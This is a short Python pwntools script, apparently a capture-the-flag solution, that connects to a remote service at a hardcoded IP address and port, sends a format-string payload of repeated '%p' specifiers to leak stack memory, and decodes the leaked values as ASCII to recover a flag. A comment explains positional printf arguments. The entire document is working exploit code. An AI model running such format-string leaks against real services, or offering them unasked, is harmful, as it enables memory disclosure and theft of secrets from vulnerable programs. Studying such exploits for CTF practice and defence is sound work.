#nc 103.41.205.26 10001

from pwn import *
from binascii import unhexlify, hexlify
from Crypto.Util.number import long_to_bytes
import struct

# use %2 to specify number of param in arguments
# int main(){
# 	printf("%2$d %1$d %3$d %5$d %4$d", 1, 2, 3, 4, 5);
# }

payload = b"%p-%p-%p-%p-%p-%p-%p-%p-%p-%p"

p = remote("103.41.205.26", 10001)
p.sendlineafter(b"?\n", payload)

ans = p.recvline().decode()
print(ans)
ans = ans.split(" ")
list_addr = ans[1].split("-")

p.close()

flag = ""
for i in list_addr:
  try:
    text = p64(int(i, 16))
    text = text.decode()
    if text.isascii():
      flag += text
  except Exception as e:
    pass

print(flag)